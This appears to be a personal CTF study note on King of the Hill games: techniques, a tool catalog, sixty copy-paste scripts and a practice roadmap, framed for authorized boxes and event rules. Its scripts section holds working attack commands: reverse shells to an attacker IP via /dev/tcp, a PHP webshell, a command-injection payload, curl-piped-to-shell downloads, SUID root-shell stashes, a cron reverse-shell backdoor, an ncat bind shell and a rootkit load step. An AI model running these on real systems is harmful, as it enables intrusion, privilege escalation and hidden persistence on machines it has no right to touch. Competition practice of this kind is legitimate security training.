# King of the Hill (KoTH) — Complete (Techniques + Catalog + Scripts + Roadmap)

KoTH = get onto a **shared** box first, **claim the hill**, then **patch your way in shut** and **hold it** while rivals try to take it. Scoring is usually **hold-time** (points per tick you own it). Think fast root → own → defend → persist. Pairs with [[Attack-Defense-Complete]] (overlapping defense ideas) and [[Home]].

> **Rules matter more here than anywhere.** They vary by platform, so read the event's rulebook first. Common rules (e.g. TryHackMe KoTH): the **king service on port 9999** is off-limits (don't stop/alter it); **patch, don't delete** whole services; **don't take the box offline** (no blanket firewall/shutdowns/stripping binaries); **killing rival shells manually is allowed but not scripted sweeps**; **full autopwn scripts are banned in public games**; **don't touch flags**; **reset only when truly broken**. Some platforms allow rootkits *if you don't break the box for others*. Only play boxes you're authorized to.

> **Mental model — four phases.** (1) **Race in:** be first to a shell + root. (2) **Claim:** write your name to the king. (3) **Lock:** patch the exact way you got in so rivals can't follow. (4) **Hold:** persist, monitor, and evict politely — without ever making the box unavailable.

---

# TECHNIQUES (explained + real-life scenarios)

## A. Format & rules awareness
1. **read the scoring model** — hold-time vs polling vs solution-quality. *Scenario:* if points are per-tick-held, keeping the crown beats a flashy first capture.
2. **identify the king mechanism** — a file, a service (port 9999), or a planted name. *Scenario:* you learn *what* to overwrite to score.
3. **know the "don't" list** — king service, offline, autopwn, flags. *Scenario:* you avoid a DQ by never touching port 9999 or killing the box.
4. **know what's allowed** — manual shell kills, port moves, rootkits (platform-dependent). *Scenario:* you move a vulnerable service to a new port — legal and effective.
5. **time awareness** — many KoTH rounds are ~60 min. *Scenario:* you don't over-invest in a perfect patch when speed wins.

## B. Recon & fast initial access
6. **fast port scan** — find the way in quickly. *Scenario:* `nmap -F` shows a web app on 80 before rivals even scan.
7. **service/version detect** — pick the known exploit. *Scenario:* `-sV` reveals a vulnerable CMS version with a public RCE.
8. **web content discovery** — hidden endpoints. *Scenario:* `ffuf` finds `/admin` or an upload that yields a shell.
9. **default/weak creds** — the fastest door. *Scenario:* `admin:admin` on the panel gets you in before anyone scans.
10. **known-CVE exploitation** — public exploit for the stack. *Scenario:* an outdated service falls to a ready exploit → first shell.
11. **file upload → webshell** — drop a shell via upload. *Scenario:* an unrestricted upload gives instant RCE.
12. **command injection** — shell through an input. *Scenario:* a ping form with `; id` becomes your shell.
13. **SQLi → creds/RCE** — database foothold. *Scenario:* dump admin creds, log in, get a shell.
14. **LFI → RCE** — log poisoning / wrappers. *Scenario:* poison a log then include it for code exec.
15. **exposed service (redis/SSH/FTP)** — misconfig entry. *Scenario:* an unauthenticated Redis writes your SSH key.
16. **stabilize the shell** — PTY upgrade. *Scenario:* `python3 -c 'pty.spawn("/bin/bash")'` gives a usable shell to work fast.
17. **be first** — speed over elegance on entry. *Scenario:* a quick webshell now beats a perfect exploit five minutes late.

## C. Privilege escalation (get root fast)
18. **automated enum (LinPEAS/lse)** — surface privesc instantly. *Scenario:* LinPEAS flags a writable service file = quick root.
19. **SUID/SGID abuse** — GTFOBins one-liners. *Scenario:* a SUID `find` spawns a root shell in one command.
20. **sudo misconfig** — `sudo -l` wins. *Scenario:* `sudo` on a text editor → shell escape → root.
21. **writable cron/service** — hijack a scheduled root task. *Scenario:* a world-writable cron script runs your code as root.
22. **PATH / wildcard injection** — hijack a called binary. *Scenario:* a root script calls `tar *`; you plant a flag file to inject options.
23. **kernel exploit** — local root via CVE. *Scenario:* an old kernel falls to a public LPE (last resort — can crash the box).
24. **capabilities abuse** — `cap_setuid` on a binary. *Scenario:* a python with capabilities sets uid 0.
25. **credential reuse** — creds from one service unlock root. *Scenario:* a DB password is also the root password.
26. **docker/lxd group** — container-to-host root. *Scenario:* membership in `docker` mounts the host and roots it.
27. **NFS no_root_squash** — root via share. *Scenario:* write a SUID binary to an exported share.

## D. Claiming the hill
28. **find the king file/target** — where your name goes. *Scenario:* on THM, write your username to the king file so the service on 9999 reports you.
29. **write your identifier** — own the target. *Scenario:* `echo myname > /root/king.txt` (whatever the mechanism is) claims the points.
30. **re-assert the claim** — keep writing it. *Scenario:* a cron re-writes your name every few seconds so a rival can't hold it long.
31. **don't stop the king service** — leave port 9999 alone. *Scenario:* you overwrite *content*, never kill the scoring service.
32. **solution-quality claim (OOO-style)** — submit the best solution. *Scenario:* in a quality-scored KoTH, you iterate a better answer each tick for more points.

## E. Patching your entry (the heart of KoTH)
33. **close the exact vuln you used** — not everything. *Scenario:* you fix the upload bug so no one else gets a shell the way you did.
34. **patch, don't delete** — keep the service running. *Scenario:* you sanitize the vulnerable parameter instead of removing the web server (which would break the box/rules).
35. **move the service to another port** — allowed dodge. *Scenario:* shifting the app off 80 breaks rivals' scanned exploits while you keep access.
36. **remove your own webshell after persisting elsewhere** — close the door behind you. *Scenario:* you delete the obvious shell so rivals can't reuse it, having stashed quieter access.
37. **rotate the creds you used** — lock others out. *Scenario:* you change the admin password you logged in with.
38. **fix file permissions you abused** — close the privesc. *Scenario:* you make the world-writable cron script root-only so no one re-roots.
39. **keep SLA/availability** — patches must not break the box. *Scenario:* you test the app still serves after patching, or you lose the hold anyway.

## F. Persistence (regain the hill if evicted)
40. **add an SSH key** — quiet re-entry. *Scenario:* your key in `authorized_keys` lets you return after a reset-of-shell.
41. **cron re-claimer** — re-write the king on a timer. *Scenario:* even if evicted for a tick, your cron re-takes the crown.
42. **systemd service implant** — survives respawns. *Scenario:* a small service re-establishes your shell if killed.
43. **alternate high-port backdoor** — a second way in. *Scenario:* when your webshell is found, your bind/reverse path still works.
44. **SUID stash** — a hidden re-escalation path. *Scenario:* a quietly-placed SUID lets you get root again fast.
45. **rootkit (only where allowed + non-breaking)** — deep persistence. *Scenario:* on platforms that permit it, a userland rootkit hides your foothold *without* breaking others' basic use (required by rules).
46. **multiple independent footholds** — redundancy. *Scenario:* killing one of your shells doesn't lose you the box.
47. **don't make persistence break the box** — rules + self-interest. *Scenario:* a persistence trick that crashes services loses you the hold and may DQ you.

## G. Evicting / disrupting rivals (within rules)
48. **find rival shells** — list sessions/processes. *Scenario:* `w`, `ps`, and `ss` reveal other players' shells.
49. **kill a rival shell (manual)** — allowed, don't script-sweep. *Scenario:* you `kill` an obvious reverse shell to drop a competitor.
50. **close the vuln they used** — better than kicking. *Scenario:* patching their entry stops them permanently, vs killing their shell every few seconds.
51. **change creds they rely on** — lock them out. *Scenario:* rotating the password they logged in with ends their access.
52. **remove their persistence** — their keys/cron/implants. *Scenario:* you delete a rival's `authorized_keys` entry and their cron re-claimer.
53. **playful disruption over destruction** — e.g. nyancat/urandom in their tty (where tolerated). *Scenario:* annoy a rival off the box without breaking it.
54. **don't DOS / don't strip the box** — stays available. *Scenario:* you never `chmod` system binaries or firewall everyone (breaks box = rule violation).

## H. Monitoring other players
55. **pspy for others' processes** — no root needed. *Scenario:* pspy shows a rival's cron and commands so you counter them.
56. **watch the king file/target** — detect takeovers. *Scenario:* a change to the king file means someone else claimed; you re-claim.
57. **watch auth/logins** — who's on the box. *Scenario:* `last`/`who` + auth.log show a new rival login to respond to.
58. **watch new files** — rivals' shells/tools. *Scenario:* inotify catches a dropped webshell you then remove.
59. **watch listeners** — rival backdoors. *Scenario:* a new high-port listener is a competitor's bind shell.
60. **watch cron/systemd** — rival persistence. *Scenario:* a new timer re-claims for a rival; you disable it.

## I. Maintaining availability
61. **never shut services down** — availability is scored/required. *Scenario:* a stopped web server breaks the box and the rules.
62. **keep the king service running** — don't touch 9999. *Scenario:* altering the scoring service is an instant rule break.
63. **light-touch patches** — don't destabilize. *Scenario:* a tiny filter beats a risky rewrite that could crash the app.
64. **avoid blanket firewalling** — that's "offline." *Scenario:* dropping all traffic to "defend" fails availability.
65. **don't strip system binaries** — breaks everyone's shell = violation. *Scenario:* removing `/bin/sh` perms is banned; don't.
66. **reset only when genuinely broken** — not as a tactic. *Scenario:* you vote reset only if the box is unusable, not to wipe rivals.

## J. Automation limits
67. **know the autopwn ban** — no start-to-root scripts in public games. *Scenario:* you run steps manually to stay within rules.
68. **no scripted shell-sweeps** — manual kills only. *Scenario:* you don't loop `pkill` on rivals; you kill specific shells by hand.
69. **allowed automation** — re-claim cron, monitors, your own persistence. *Scenario:* a cron re-writing *your* king claim is fine; auto-rooting the box isn't.
70. **private games = go wild** — automation OK with friends. *Scenario:* you test full autopwn only in a private lobby.

## K. Solution-quality KoTH variant (OOO/DEF CON style)
71. **understand the service** — the "hill" is the best answer to a problem. *Scenario:* each tick, teams submit solutions; the best earns top KoH points.
72. **iterate each tick** — improve your submission. *Scenario:* you refine your solution so you're tied-for-first every tick.
73. **weight your effort** — KoH may be ~20% of score vs attack/defense. *Scenario:* you don't neglect A/D to chase KoH points.
74. **tiered scoring** — top solutions get most; ties share. *Scenario:* being in the top tie each tick compounds over the game.

## L. Speed & scoring strategy
75. **first blood matters** — early uncontested hold. *Scenario:* rooting first means uninterrupted points before rivals arrive.
76. **hold > recapture** — defense extends the lead. *Scenario:* patching your entry earns more than re-rooting repeatedly.
77. **prioritize the fastest root path** — not the coolest. *Scenario:* a SUID GTFOBin beats chasing a kernel exploit.
78. **re-claim aggressively** — tiny interval cron. *Scenario:* your name is on the king more ticks than anyone else's.
79. **counter-patch rivals' entries** — shrink the field. *Scenario:* once you're in, closing every other door leaves only you.
80. **balance claim vs defense** — don't tunnel-vision. *Scenario:* you alternate re-claiming and patching so you both score and hold.

## M. Common pitfalls / rule violations
81. **breaking the box** — instant loss/DQ. *Scenario:* a kernel exploit panics the box; everyone loses, including you.
82. **touching the king service** — banned. *Scenario:* stopping port 9999 to "deny" rivals gets you penalized.
83. **scripted autopwn in public** — banned. *Scenario:* an auto-root script disqualifies you.
84. **blanket firewall / shutdown** — availability fail. *Scenario:* `iptables -P INPUT DROP` takes the box offline — don't.
85. **stripping binaries/permissions** — breaks others = violation. *Scenario:* `chmod 000 /bin/*` is an instant rule break.
86. **deleting whole services** — breaks the box. *Scenario:* removing the web server instead of patching it fails availability.
87. **spamming resets** — only for broken boxes. *Scenario:* reset-voting to wipe rivals is abuse.
88. **DOS between players** — banned, clogs the box. *Scenario:* two teams scripting floods made a real event's server unreachable — don't.
89. **forgetting to patch your own entry** — rivals walk in behind you. *Scenario:* you rooted but left the door open; a rival follows instantly.
90. **no persistence** — one eviction ends your run. *Scenario:* your single shell gets killed and you're locked out.

---

# CATALOG (real tools — verify before the event)

## Recon / initial access
1. **nmap** — port/service scan `nmap.org`
2. **rustscan** — fast port scan → nmap
3. **masscan** — very fast scan
4. **ffuf / feroxbuster / gobuster** — web content discovery
5. **nikto** — quick web vuln scan
6. **whatweb** — tech fingerprint
7. **searchsploit (Exploit-DB)** — find public exploits `apt install exploitdb`
8. **Metasploit** — exploit framework (if allowed)
9. **hydra** — credential brute (if allowed by rules)
10. **netcat / ncat / socat** — shells/relays
11. **curl / wget** — web interaction
12. **wfuzz** — parameter fuzzing

## Privilege escalation
13. **LinPEAS** — Linux privesc enum `github.com/peass-ng/PEASS-ng`
14. **linux-smart-enumeration (lse.sh)** — tiered enum `github.com/diego-treitos/linux-smart-enumeration`
15. **GTFOBins** — SUID/sudo escape reference `gtfobins.github.io`
16. **pspy** — watch processes/cron without root `github.com/DominicBreuker/pspy`
17. **linux-exploit-suggester** — kernel LPE matcher `github.com/mzet-/linux-exploit-suggester`
18. **sudo / find / tar / vim etc.** — GTFOBins vectors
19. **Deepce** — docker privesc enum `github.com/stealthcopter/deepce`
20. **traitor** — automated Linux privesc (lab/private) `github.com/liamg/traitor`

## Shells / access
21. **bash / sh reverse & bind shells** — core shells
22. **python/php/perl one-liner shells** — webshell payloads
23. **socat TTY** — fully interactive shell
24. **tmux / screen** — keep sessions alive
25. **chisel** — tunneling/pivot `github.com/jpillora/chisel`
26. **ligolo-ng / sshuttle** — pivoting (if needed)

## KoTH-specific toolkits
27. **migueltc13/KoTH-Tools** — KoTH helper scripts `github.com/migueltc13/KoTH-Tools`
28. **Terraminator/thm-koth-tricks** — THM KoTH tricks `github.com/Terraminator/thm-koth-tricks`
29. **0xSebin/King-of-the-hill** — KoTH writeups/scripts `github.com/0xSebin/King-of-the-hill`
30. **TryHackMe KoTH guide** — official strategy `tryhackme.com/resources/blog/guide-to-king-of-the-hill`
31. **CTFd KoTH challenge type** — polling-owner scoring `docs.ctfd.io`

## Monitoring / detection (hold the hill)
32. **pspy** — rivals' processes (dup, core tool)
33. **inotifywait (inotify-tools)** — file-change watch
34. **auditd** — exec/auth auditing
35. **ss / netstat** — listeners & connections
36. **lsof** — open files/sockets
37. **w / who / last** — logged-in rivals
38. **htop / ps** — process inspection
39. **watch** — poll any command on an interval

## Persistence (within rules)
40. **ssh-keygen + authorized_keys** — key persistence
41. **crontab / at** — scheduled re-claim/re-shell
42. **systemd units/timers** — service persistence
43. **MSF persistence modules** — (if framework allowed)
44. **userland rootkits** — e.g. Diamorphine-style LKM (ONLY where rules allow + non-breaking) `github.com/m0nad/Diamorphine`
45. **authorized_keys + SUID stash** — redundant footholds

## Hardening / patching (your entry)
46. **git** — track/revert service changes
47. **iptables/nftables** — targeted (not blanket!) rules
48. **sed/patch** — surgical source edits
49. **chmod/chown/chattr** — fix abused perms (never strip system bins)
50. **mod_security** — WAF if a web service is the entry
51. **fail2ban** — ban brute-forcers (not blanket block)

## Enumeration helpers
52. **enum4linux-ng** — SMB enum
53. **smbclient** — SMB shares
54. **snmpwalk** — SNMP
55. **dirsearch** — web dir brute
56. **jq** — parse JSON APIs
57. **gef/pwndbg** — if a binary service is the target

## Reference / learning
58. **GTFOBins / LOLBAS** — living-off-the-land binaries
59. **HackTricks** — privesc + exploitation reference `book.hacktricks.xyz`
60. **PayloadsAllTheThings** — payloads/bypasses `github.com/swisskyrepo/PayloadsAllTheThings`
61. **OOO DEF CON finals writeups** — solution-quality KoH `oooverflow.io`
62. **TryHackMe KoTH rooms** — practice (e.g. `kothhackers`, `koth`)

> ~60 real tools — the genuine KoTH/entry/privesc/persist/monitor toolset. KoTH reuses general offense + defense tooling; a padded "500" would be fiction.

---

# SCRIPTS (copy-paste; 🟢 easy / 🟡 medium / 🔴 hard)

Only against boxes you're authorized to. Respect the event rules (no autopwn/sweeps in public games; never break the box).

## Race in — recon
🟢 1. fast top-ports scan
```bash
nmap -F -T4 TARGET
```
🟢 2. full scan + version + scripts
```bash
nmap -sC -sV -p- -T4 TARGET
```
🟢 3. web content discovery
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://TARGET/FUZZ -mc 200,301,302,403
```
🟢 4. quick vuln sweep
```bash
nikto -h http://TARGET
```
🟢 5. find a public exploit
```bash
searchsploit <service> <version>
```
🟢 6. test default creds fast
```bash
curl -s -u admin:admin http://TARGET/admin | head
```

## Get a shell
🟡 7. bash reverse shell
```bash
bash -i >& /dev/tcp/YOURIP/4444 0>&1
```
🟡 8. php webshell (drop via upload)
```php
<?php system($_GET['c']); ?>
```
🟡 9. python PTY upgrade
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm
```
🟡 10. socat fully-interactive TTY
```bash
# attacker: socat file:`tty`,raw,echo=0 tcp-listen:4445
# victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOURIP:4445
```
🟡 11. command-injection shell
```bash
curl "http://TARGET/ping?host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/YOURIP/4444 0>&1'"
```
🟡 12. write SSH key via exposed Redis
```bash
# redis-cli -h TARGET; set a key with your pubkey, save to authorized_keys dir
```

## Privilege escalation
🟢 13. quick wins check
```bash
id; sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /etc/crontab
```
🟡 14. LinPEAS
```bash
curl -s YOURIP/linpeas.sh | sh | tee /tmp/lp.txt
```
🟡 15. lse tiered enum
```bash
./lse.sh -l1
```
🟡 16. SUID escape (GTFOBins example: find)
```bash
find . -exec /bin/sh -p \; -quit
```
🟡 17. sudo shell escape (example: vim)
```bash
sudo vim -c ':!/bin/sh'
```
🟡 18. writable cron hijack
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/writable_cron.sh
```
🟡 19. kernel LPE suggester
```bash
./linux-exploit-suggester.sh
```
🟡 20. docker group → host root
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
🟡 21. use the root shell
```bash
/tmp/rootbash -p   # from the SUID trick above
```

## Claim the hill
🟡 22. claim the king (generic)
```bash
echo "MYNAME" > /path/to/king   # whatever the mechanism is; NEVER touch port 9999 service
```
🟡 23. re-claim on a timer (cron, allowed)
```bash
( crontab -l 2>/dev/null; echo "* * * * * echo MYNAME > /path/to/king" ) | crontab -
```
🟡 24. tight re-claim loop (your own session)
```bash
while true; do echo MYNAME > /path/to/king; sleep 5; done &
```
🟡 25. verify you own it
```bash
cat /path/to/king
```

## Patch your entry (lock the door)
🟡 26. remove the upload bug (example: disable the endpoint logic, keep server up)
```bash
sed -i 's/move_uploaded_file/\/\/move_uploaded_file/' /var/www/upload.php
```
🟡 27. move a service to a new port (allowed dodge)
```bash
# edit the app/listen config to a new port; keep it RUNNING, don't kill it
```
🟡 28. rotate the admin password you used
```bash
# in the app DB/config: set a new admin password, then verify login still works
```
🟡 29. fix the perms you abused (no system-bin stripping!)
```bash
chmod 700 /path/writable_cron.sh
```
🟡 30. delete your loud webshell (after persisting elsewhere)
```bash
rm /var/www/shell.php
```
🟡 31. confirm the service still answers (availability)
```bash
curl -fsS http://127.0.0.1/ >/dev/null && echo UP || echo "DOWN - revert!"
```

## Persistence (regain if evicted; within rules)
🟡 32. add your SSH key
```bash
mkdir -p ~/.ssh; echo "ssh-ed25519 AAAA... you" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys
```
🟡 33. cron re-shell (quiet re-entry)
```bash
( crontab -l 2>/dev/null; echo "*/2 * * * * bash -c 'bash -i >& /dev/tcp/YOURIP/4446 0>&1'" ) | crontab -
```
🟡 34. systemd re-claim service
```bash
printf '[Service]\nExecStart=/bin/bash -c "while true; do echo MYNAME > /path/king; sleep 5; done"\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/king.service
systemctl enable --now king
```
🟡 35. SUID re-escalation stash
```bash
cp /bin/bash /usr/lib/.k; chmod +s /usr/lib/.k   # /usr/lib/.k -p for root later
```
🟡 36. second high-port listener
```bash
setsid bash -c 'while true; do ncat -lvp 5555 -e /bin/bash; done' &>/dev/null &
```
🔴 37. LKM rootkit (ONLY where rules allow, must not break box)
```bash
# e.g. Diamorphine: make && insmod diamorphine.ko  — hides your foothold; test it doesn't break others
```

## Monitor rivals
🟡 38. pspy (their processes/cron)
```bash
./pspy64
```
🟡 39. watch the king for takeovers
```bash
while true; do cat /path/king; sleep 3; done
```
🟡 40. who's logged in
```bash
w; last -n 20; tail -f /var/log/auth.log
```
🟡 41. new files (rivals' shells)
```bash
inotifywait -mr /var/www /tmp /home -e create,modify
```
🟡 42. rival listeners
```bash
watch -n2 'ss -tlnp'
```
🟡 43. rival cron/persistence
```bash
for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null; done; systemctl list-timers --all
```
🟡 44. recently modified files
```bash
find / -xdev -mmin -10 -type f 2>/dev/null | grep -vE '/proc|/sys|/run'
```

## Evict rivals (manual, within rules)
🟡 45. list rival shells/sessions
```bash
ps aux | grep -E 'bash -i|nc |ncat|/dev/tcp'; ss -tnp
```
🟡 46. kill a specific rival shell (manual, allowed)
```bash
kill -9 <PID>    # target one shell; do NOT script-sweep all in public games
```
🟡 47. remove a rival SSH key
```bash
# edit the user's authorized_keys, delete the line that isn't yours
```
🟡 48. disable a rival cron re-claimer
```bash
crontab -r -u <rivaluser>   # if it's theirs and rules allow
```
🟡 49. change creds a rival relies on
```bash
# rotate the admin/db password they used; verify the service still works
```
🟡 50. playful nudge (where tolerated)
```bash
# write to a rival's tty, e.g. a message — NOT breaking the box
```

## Availability guards (don't lose by breaking the box)
🟢 51. confirm king service (9999) is untouched
```bash
ss -tlnp | grep 9999   # it must stay up; never stop/alter it
```
🟡 52. self-check all scored services are up
```bash
for p in 80 22 9999; do (echo >/dev/tcp/127.0.0.1/$p) 2>/dev/null && echo "$p up" || echo "$p DOWN"; done
```
🟡 53. revert a patch that broke availability
```bash
git -C /var/www checkout -- .   # if you git-init'd the web root
```
🟡 54. back up before editing
```bash
cp -a /var/www /root/www.bak
```

## Solution-quality KoTH (OOO-style)
🟡 55. submit/iterate a solution each tick
```bash
# automate: compute your best answer, submit via the game API each tick, improve next tick
```

## Glue / helpers
🟢 56. host your tools over HTTP (to curl onto the box)
```bash
python3 -m http.server 8000   # on your attacker machine
```
🟢 57. pull a tool onto the box
```bash
curl -s YOURIP:8000/linpeas.sh -o /tmp/l.sh; chmod +x /tmp/l.sh
```
🟡 58. keep your session alive
```bash
tmux new -d -s hold 'while true; do echo MYNAME > /path/king; sleep 5; done'
```
🟡 59. quick GTFOBins lookup offline
```bash
# clone gtfobins or grep a local copy for the SUID binary you found
```
🟡 60. one-glance status
```bash
echo "KING:$(cat /path/king) | 9999:$(ss -tlnp|grep -c 9999) | myshells:$(pgrep -c -f 'king.service')"
```


---

## 🗺️ DCTF Roadmap — King of the Hill

> **Honesty check:** DCTF's own final is **Attack & Defense**, not KoTH — so KoTH isn't a DCTF-final format. But KoTH trains exactly the skills the A/D final rewards: **fast rooting, patching your own entry, persistence, and holding a box under contention.** Many other CTFs (and TryHackMe) use KoTH directly. See [[Attack-Defense-Complete]] and [[Roadmap]].

### What to study (in order)
1. **Fast initial access** — web exploitation, default creds, public-CVE use. (techniques B)
2. **Linux privesc to root, fast** — SUID/sudo/cron/caps + LinPEAS/GTFOBins. (techniques C)
3. **Claiming + patching your entry** — the KoTH core. (techniques D–E)
4. **Persistence** — keys, cron, services, (rule-permitting) rootkits. (techniques F)
5. **Monitoring + eviction (within rules)** — pspy, watch, manual kills. (techniques G–H)
6. **Availability discipline** — never break the box. (techniques I, M)

### How to study
- **Speed-root drills.** The winner is usually whoever roots *and locks the door* first. Practice privesc until it's reflex.
- **Learn the rulebook cold** — half of KoTH losses are rule violations (touching 9999, breaking the box, scripted sweeps).
- **Patch-your-own-entry mindset** — after every rooted practice box, ask "how would I stop the next person doing exactly this?"
- Use **GTFOBins + LinPEAS** until you can privesc a typical box in minutes.

### How to exercise
- **TryHackMe KoTH** (lobbies + the standalone `kothhackers`/`Hackers` room) — the main place to practice this mode live.
- **HackTheBox / proving grounds** boxes for the root-fast muscle.
- Private KoTH lobbies with friends — where full automation is allowed, to test persistence/monitoring.
- Drill: root a practice box, claim, patch your entry, and set persistence in <15 minutes.

### How to do things (per-round workflow)
1. Scan fast, get the first shell by the quickest path. (scripts 1–12)
2. Privesc to root immediately (LinPEAS → GTFOBins). (scripts 13–21)
3. Claim the hill + set a re-claim cron. (scripts 22–24)
4. **Patch the exact entry you used** (and keep the service up). (scripts 26–31)
5. Set persistence + start monitoring rivals. (scripts 32–44)
6. Evict rivals manually, counter-patch their entries, hold — never break the box. (scripts 45–53)

### Golden rules
- **Hold-time wins** — patching your entry beats re-rooting.
- **Never break the box** (no shutdowns, no stripping binaries, leave port 9999).
- **Manual kills only** in public games; **no autopwn**.
- **Persist redundantly** so one eviction doesn't end your run.
- **Read the event rules first** — they override everything here.

> Tags: #ctf #koth #king-of-the-hill #techniques #catalog #scripts #roadmap #dctf
